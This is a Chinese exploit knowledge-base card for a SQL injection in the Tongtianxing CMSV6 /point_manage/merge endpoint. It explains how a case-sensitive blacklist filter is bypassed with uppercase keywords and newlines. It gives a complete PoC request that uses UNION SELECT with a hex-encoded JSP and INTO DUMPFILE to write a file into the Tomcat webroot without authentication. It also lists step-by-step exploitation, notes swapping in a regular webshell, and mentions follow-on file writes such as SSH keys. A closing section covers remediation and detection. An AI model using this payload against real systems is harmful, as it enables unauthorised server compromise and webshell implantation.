---
id: web-generic-sqli-cmsv6-point-manage-merge-name-dumpfile
title: 通天星 CMSV6 point_manage/merge 的 name 直拼 WHERE：大写/换行绕过 XssSqlFilter 后 UNION INTO DUMPFILE 写 JSP WebShell
type: scenario
domain: web
path: web/generic/sqli
technique: sql-injection-blacklist-bypass-into-dumpfile
aliases:
- 通天星 CMSV6 SQL 注入
- point_manage merge 注入
- PointLineRelationController 注入
- xj_point_manage 注入
- CMSV6 INTO DUMPFILE getshell
tags:
- sqli
- java
- mysql
- struts2
- filter-bypass
- dumpfile
- webshell
- cmsv6
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V297
  verified_at: '2026-11-08T09:02:41+08:00'
  notes: 已对照原文与全部18张图核对：PointLineRelationController#merge→PointManageDao#getPointByName的name直拼WHERE（图03-06）、旧版XssSqlFilter区分大小写contains黑名单、8列UNION+0x十六进制JSP+INTO dumpfile到tomcat/webapps/gpsweb/allgods.jsp的PoC均与原文一致；新正则版会拦UNION SELECT已在卡内注明。未验证点：未实际请求/未验证FILE权限与secure_file_priv。
---

## 一句话结论

`POST /point_manage/merge` 把 `name` 直接拼进 `WHERE a.name = '%s'`，前置的 `XssSqlFilter` 只做区分大小写的 `String.contains` 黑名单（且真正执行的旧版不含 `union` 关键字），用大写 `UNION SELECT`、`%0a` 换行和十六进制字符串即可绕过，再借 MySQL `INTO DUMPFILE` 把 JSP 写到 Tomcat `webapps` 下直接执行。

## 原理

- 入口在 `com.gps808.inspect.controller.PointLineRelationController#merge`：`@PostMapping("/merge")` 用 `RequestUtil.getRequestParams(PointManageVo.class)` 绑定表单，随后调用 `pointManageService.merge(param)`。
- `merge()` 先调 `nameExsit(param.getName(), param.getId())`，再进入 `PointManageDao#getPointByName`。该 DAO 用 `StringBuilder` 拼 SQL，实际语句为：

  ```sql
  SELECT a.id as id, a.name as name, a.type as type, a.map_id as mapId,
         a.install_place as installPlace, a.check_item as checkItem,
         a.update_time as updateTime, a.create_time as createTime
  FROM xj_point_manage a
  WHERE a.name = '%s' AND a.id != '%d'
  ```

  `name` 是字符串拼接，`id` 走 `%d`，所以注入点是 `name`，`id` 只用于满足语法。
- 过滤层在 `web.xml` 中把 `com.gpsCommon.filter.XssFilter`（`XssSqlFilter`）映射到 `/*` 且 `dispatcher=REQUEST`。旧实现的拦截逻辑是：

  ```java
  String badStr = "'insert |select |delete |update |drop |truncate |declare |...|sleep(|/*";
  for (String s : badStr.split("\\|")) {
      if (str.contains(s)) return true;   // 区分大小写
  }
  ```

  黑名单条目带尾随空格且用 `contains` 做大小写敏感匹配，因此大写 `SELECT`、`UNION`、`SLEEP` 不会被命中；`UNION%0aSELECT` 还可用换行打断基于「空格 + 关键字」的正则。文章同时给出了更新版把 `badStrReg` 编译为 `Pattern.compile(badStrReg, CASE_INSENSITIVE)` 的正则版本，说明该注入主要存在于仅用旧 `contains` 黑名单的版本；若目标已是正则版，`UNION SELECT` 会被拦，需要换用未被覆盖的语法/函数或改用布尔/时间盲注。
- 写入文件依赖 MySQL 的 `INTO DUMPFILE`：SELECT 的结果由数据库进程写到服务器文件系统，路径相对 `datadir`（或由 `secure_file_priv` 限定）。数据库账号需要 `FILE` 权限、`secure_file_priv` 允许目标目录、且数据库与 Tomcat 在同一主机（或目标路径可达）。`../../tomcat/webapps/gpsweb/allgods.jsp` 即从数据目录向上跳出，落进 Web 根。
- 过滤器把 `%27`、`()`、`/**/` 等也列入黑名单，因此 payload 用十六进制字符串表示 JSP（避免引号），并用 `%0a` 而不是空格分隔关键字。

## 触发条件

- 目标为使用旧版 `XssSqlFilter`（仅区分大小写 `contains` 黑名单）的通天星 CMSV6，`/point_manage/merge` 可从外部访问；文章 PoC 未携带 Cookie，属于前台未授权可达。
- MySQL 账号具备 `FILE` 权限，`secure_file_priv` 为空或指向可写目录，数据库进程对 Tomcat `webapps/gpsweb` 有写权限。
- 目标表 `xj_point_manage` 可查询；`user_session` 等表存在，供注入的 SELECT 取行（`FROM user_session a WHERE '1 '='1`）。
- 若目标已启用正则版过滤器，本条直接 payload 会被拦，需要另找绕过或改用盲注。

## 利用步骤

1. 先确认注入：向 `/point_manage/merge` POST `name=1'`，观察报错/业务异常；再用 `name=1' AND '1'='1` 与 `name=1' AND '1'='2` 的返回差异确认 WHERE 型注入。
2. 数出 SELECT 的 8 个列（id、name、type、map_id、install_place、check_item、update_time、create_time），构造 8 列 UNION。
3. 用十六进制字符串承载 JSP，避免单引号被过滤器/转义破坏；在末尾 `INTO DUMPFILE '<相对路径>' FROM user_session a WHERE '1 '='1` 写入 Web 根。
4. 访问写入的 JSP 验证执行；文章 PoC 的 JSP 会打印 `zz010f` 并通过 `application.getRealPath(request.getServletPath())` 删除自身，属于一次性验证马，实战可替换为常规 WebShell。
5. 失败时依次排查：`FILE` 权限、`secure_file_priv`、路径相对基准、Web 目录写权限、过滤器是否为正则版。

## PoC

文章给出的最小请求（表单字段需补全，`type/map_id/install_place/check_item/create_time/update_time` 只是占位）：

```http
POST /point_manage/merge HTTP/1.1
Host: ip
Content-Type: application/x-www-form-urlencoded

id=1&name=1' UNION SELECT%0aNULL, 0x3c25206f75742e7072696e7428227a7a3031306622293b206e6577206a6176612e696f2e46696c65286170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574536572766c657450617468282929292e64656c65746528293b20253e,NULL,NULL,NULL,NULL,NULL,NULL
INTO dumpfile '../../tomcat/webapps/gpsweb/allgods.jsp' FROM user_session a
WHERE '1 '='1 &type=3&map_id=4&install_place=5&check_item=6&create_time=7&update_time=8
```

其中十六进制解码为：

```jsp
<% out.print("zz010f"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
```

写入成功后访问 `http://ip/allgods.jsp`，页面输出 `zz010f` 即证明 JSP 已被 Tomcat 解析执行。

## 变体与关联

- 同一套 `XssSqlFilter` 还影响另一处原生 SQL：`EduSecurityOfficerDao#disable` 的 `UPDATE ... WHERE ID in (" + ids + ")`，见 `web/generic/sqli` 下 CMSV6 disable 卡；两处注入点不同（一个 SELECT 的 WHERE name，一个 UPDATE 的 IN 列表），但共用「大写关键字 + URL 编码括号」的过滤器绕过思路。
- 不依赖 `INTO DUMPFILE` 时，同一注入点可用于 UNION 回显拖库、报错注入或时间盲注；`INTO OUTFILE` 与 `DUMPFILE` 的区别是前者带列分隔符、后者只写单行原始内容。
- 若数据库与 Web 分离，可改为写数据库可写的其他路径（如计划任务、SSH 公钥）或改用 UDF 提权；这属于通用 MySQL 写文件链，不在此展开。

## 检测与防御

- 修复：`getPointByName` 改用 `PreparedStatement`/命名参数绑定 `name`，`id` 用整型绑定；禁止把用户输入拼进 SQL 文本。
- 不要把 `XssSqlFilter` 当安全边界：黑名单大小写、编码、换行、注释都能绕过；应作为纵深防御的日志/拦截辅助，而不是唯一防线。
- 数据库侧：应用账号撤销 `FILE` 权限；`secure_file_priv` 指向专用目录；数据库进程账号对 Web 目录无写权限；Web 与 DB 分机部署。
- 检测：监控包含 `INTO DUMPFILE`/`INTO OUTFILE` 的 SQL 日志与突然出现的 JSP；对 `/point_manage/merge` 的 `name` 参数做大小写不敏感的危险关键字与 `%0a`/十六进制长串检测；WAF 规则需覆盖 `UNION` 后跟换行/注释的情况。
- 排查：Web 根下出现非业务 JSP、Tomcat 访问日志中出现新 JSP 的首次访问，均可作为入侵指标。
